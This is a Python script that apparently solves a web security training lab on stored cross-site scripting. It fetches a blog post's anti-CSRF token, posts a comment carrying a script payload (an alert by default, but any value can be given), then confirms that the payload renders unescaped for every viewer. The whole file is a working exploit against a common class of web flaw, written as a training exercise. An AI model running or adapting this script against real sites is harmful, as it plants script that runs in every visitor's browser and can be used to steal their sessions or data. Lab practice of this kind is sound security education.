import argparse
import re
import requests

# Stored XSS into HTML context with nothing encoded. A blog comment is saved
# server-side and rendered back into the post's HTML with no output encoding, so
# an injected <script> tag executes for every viewer. This script posts the
# comment (fetching the required postId + anti-CSRF token first), then confirms
# the payload is stored unescaped on the post page. The alert fires in a browser.

parser = argparse.ArgumentParser(description="Solve XSS lab 2 (stored into HTML context, nothing encoded)")
parser.add_argument("lab_url", help="Lab URL (https://0a...web-security-academy.net)")
parser.add_argument("--post", default="1", help="Blog postId to comment on")
parser.add_argument("--payload", default="<script>alert(1)</script>", help="XSS payload for the comment body")
args = parser.parse_args()

lab_url = args.lab_url.rstrip("/")
post_path = f"/post?postId={args.post}"

s = requests.Session()

# the comment form carries a per-session anti-CSRF token; grab it from the post page
post_page = s.get(lab_url + post_path).text
m = re.search(r'name="csrf" value="([^"]+)"', post_page)
if not m:
    print("[!] Couldn't find the csrf token on the post page; check the postId.")
    raise SystemExit(1)
csrf = m.group(1)

print(f"[*] Posting comment with payload to {post_path} ...")
s.post(lab_url + "/post/comment", data={
    "csrf": csrf,
    "postId": args.post,
    "comment": args.payload,
    "name": "attacker",
    "email": "attacker@evil.com",
    "website": "https://evil.com",
})

# confirm the payload is stored unescaped on the rendered post
if args.payload in s.get(lab_url + post_path).text:
    print(f"[+] Payload stored unescaped: {args.payload}")
    print("[+] It executes for every viewer of the post -> alert() fires in a browser.")
else:
    print("[!] Payload not found verbatim on the post; it may be encoded/filtered.")

if "is-solved" in s.get(lab_url + "/").text:
    print("[+] Lab solved!")
else:
    print(f"[!] Not marked solved yet - open {lab_url}{post_path} in a browser to trigger the alert.")
